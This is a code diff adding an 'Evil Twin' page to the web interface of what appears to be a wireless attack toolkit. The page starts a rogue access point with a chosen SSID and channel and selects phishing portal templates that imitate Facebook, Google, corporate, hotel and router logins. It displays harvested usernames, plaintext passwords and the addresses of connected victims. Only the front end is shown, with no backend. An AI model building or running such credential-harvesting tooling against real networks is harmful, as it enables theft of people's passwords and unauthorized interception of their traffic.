@@ -376,6 +376,7 @@ _BASE = """
         <a href="/map" class="nav-item {{ 'active' if active == 'map' else '' }}" title="Map">🗺️</a>
         <a href="/captures" class="nav-item {{ 'active' if active == 'captures' else '' }}" title="Captures">📡</a>
         <a href="/bluetooth" class="nav-item {{ 'active' if active == 'bluetooth' else '' }}" title="Bluetooth">📶</a>
+        <a href="/eviltwin" class="nav-item {{ 'active' if active == 'eviltwin' else '' }}" title="Evil Twin">👿</a>
         <a href="/config" class="nav-item {{ 'active' if active == 'config' else '' }}" title="Config">⚙️</a>
     </nav>
     
@@ -1386,3 +1387,219 @@ def bluetooth_page():
     </script>
     """
     return render_template_string(_BASE, title=cfg.web.title, active="bluetooth", content=content)
+
+
+@ui_bp.route("/eviltwin")
+def eviltwin_page():
+    """Evil Twin attack page."""
+    cfg = _cfg()
+    content = """
+    <h1 class="page-title">👿 Evil Twin</h1>
+    
+    <div class="stat-grid">
+        <div class="stat-card">
+            <span class="stat-value" id="status">Stopped</span>
+            <span class="stat-label">Status</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-value" id="clients">0</span>
+            <span class="stat-label">Connected</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-value" id="creds">0</span>
+            <span class="stat-label">Credentials</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-value" id="ssid">-</span>
+            <span class="stat-label">SSID</span>
+        </div>
+    </div>
+    
+    <div class="card-grid">
+        <div class="card">
+            <div class="card-header">
+                <span class="card-title">🚀 Start Attack</span>
+            </div>
+            <div class="card-body">
+                <form id="attack-form">
+                    <div class="form-group">
+                        <label>Target SSID</label>
+                        <input type="text" id="target-ssid" placeholder="FreeWiFi" value="FreeWiFi" style="width:100%; padding:10px; border:1px solid var(--border); border-radius:6px; background:var(--bg-card); color:var(--text-primary);">
+                    </div>
+                    <div class="form-group" style="margin-top:15px;">
+                        <label>Channel</label>
+                        <input type="number" id="channel" value="6" min="1" max="14" style="width:100%; padding:10px; border:1px solid var(--border); border-radius:6px; background:var(--bg-card); color:var(--text-primary);">
+                    </div>
+                    <div class="form-group" style="margin-top:15px;">
+                        <label>Portal Template</label>
+                        <select id="template" style="width:100%; padding:10px; border:1px solid var(--border); border-radius:6px; background:var(--bg-card); color:var(--text-primary);">
+                            <option value="generic">Generic WiFi</option>
+                            <option value="hotel">Hotel Guest</option>
+                            <option value="corporate">Corporate</option>
+                            <option value="facebook">Facebook</option>
+                            <option value="google">Google</option>
+                            <option value="router">Router Login</option>
+                        </select>
+                    </div>
+                    <div style="margin-top:20px; display:flex; gap:10px;">
+                        <button type="submit" class="btn btn-primary" id="start-btn">Start Attack</button>
+                        <button type="button" class="btn btn-danger" id="stop-btn">Stop</button>
+                    </div>
+                </form>
+                <div id="attack-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-header">
+                <span class="card-title">💀 Captured Credentials</span>
+            </div>
+            <div class="card-body">
+                <div id="creds-list" style="max-height:400px; overflow-y:auto;">
+                    <p style="color:var(--text-muted);">No credentials captured yet.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="card" style="margin-top:20px;">
+        <div class="card-header">
+            <span class="card-title">📱 Connected Clients</span>
+        </div>
+        <div class="card-body">
+            <table class="table">
+                <thead>
+                    <tr>
+                        <th>MAC Address</th>
+                        <th>IP Address</th>
+                        <th>Connected At</th>
+                        <th>Credentials</th>
+                    </tr>
+                </thead>
+                <tbody id="clients-list">
+                    <tr><td colspan="4" style="color:var(--text-muted);">No clients connected.</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    
+    <script>
+        async function loadStatus() {
+            try {
+                const resp = await fetch('/api/eviltwin/status');
+                if (!resp.ok) return;
+                const data = await resp.json();
+                
+                document.getElementById('status').textContent = data.status || 'stopped';
+                document.getElementById('clients').textContent = data.clients_connected || 0;
+                document.getElementById('creds').textContent = data.credentials_captured || 0;
+                document.getElementById('ssid').textContent = data.current_ssid || '-';
+                
+                const statusEl = document.getElementById('status');
+                statusEl.style.color = data.status === 'running' ? 'var(--accent-green)' : 'var(--text-muted)';
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        
+        async function loadCredentials() {
+            try {
+                const resp = await fetch('/api/eviltwin/credentials');
+                if (!resp.ok) return;
+                const data = await resp.json();
+                
+                const container = document.getElementById('creds-list');
+                if (!data.credentials || data.credentials.length === 0) {
+                    container.innerHTML = '<p style="color:var(--text-muted);">No credentials captured yet.</p>';
+                    return;
+                }
+                
+                container.innerHTML = data.credentials.reverse().map(c => `
+                    <div style="background:var(--bg-card-hover); padding:12px; border-radius:8px; margin-bottom:8px; border-left:3px solid var(--accent-red);">
+                        <div style="display:flex; justify-content:space-between;">
+                            <strong style="color:var(--accent-cyan);">${c.username}</strong>
+                            <small style="color:var(--text-muted);">${c.timestamp}</small>
+                        </div>
+                        <div style="color:var(--accent-orange); font-family:monospace; margin-top:5px;">🔑 ${c.password}</div>
+                        <small style="color:var(--text-muted);">${c.client_ip} | ${c.ssid}</small>
+                    </div>
+                `).join('');
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        
+        async function loadClients() {
+            try {
+                const resp = await fetch('/api/eviltwin/clients');
+                if (!resp.ok) return;
+                const data = await resp.json();
+                
+                const tbody = document.getElementById('clients-list');
+                if (!data.clients || data.clients.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="color:var(--text-muted);">No clients connected.</td></tr>';
+                    return;
+                }
+                
+                tbody.innerHTML = data.clients.map(c => `
+                    <tr>
+                        <td><code>${c.mac_address}</code></td>
+                        <td>${c.ip_address || '-'}</td>
+                        <td>${c.connected_at}</td>
+                        <td>${c.credentials_captured ? '<span class="badge badge-success">✓</span>' : '-'}</td>
+                    </tr>
+                `).join('');
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        
+        document.getElementById('attack-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const result = document.getElementById('attack-result');
+            result.innerHTML = '<span style="color:var(--accent-cyan);">Starting attack...</span>';
+            
+            try {
+                const resp = await fetch('/api/eviltwin/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        ssid: document.getElementById('target-ssid').value,
+                        channel: parseInt(document.getElementById('channel').value),
+                        template: document.getElementById('template').value,
+                    })
+                });
+                const data = await resp.json();
+                
+                if (data.ok) {
+                    result.innerHTML = '<span style="color:var(--accent-green);">✅ Attack started!</span>';
+                    loadStatus();
+                } else {
+                    result.innerHTML = `<span style="color:var(--accent-red);">❌ ${data.error}</span>`;
+                }
+            } catch (e) {
+                result.innerHTML = `<span style="color:var(--accent-red);">❌ ${e.message}</span>`;
+            }
+        });
+        
+        document.getElementById('stop-btn').addEventListener('click', async () => {
+            const result = document.getElementById('attack-result');
+            try {
+                await fetch('/api/eviltwin/stop', {method: 'POST'});
+                result.innerHTML = '<span style="color:var(--text-muted);">Attack stopped.</span>';
+                loadStatus();
+            } catch (e) {
+                result.innerHTML = `<span style="color:var(--accent-red);">❌ ${e.message}</span>`;
+            }
+        });
+        
+        // Initial load and auto-refresh
+        loadStatus();
+        loadCredentials();
+        loadClients();
+        setInterval(loadStatus, 3000);
+        setInterval(loadCredentials, 5000);
+        setInterval(loadClients, 5000);
+    </script>
+    """
+    return render_template_string(_BASE, title=cfg.web.title, active="eviltwin", content=content)
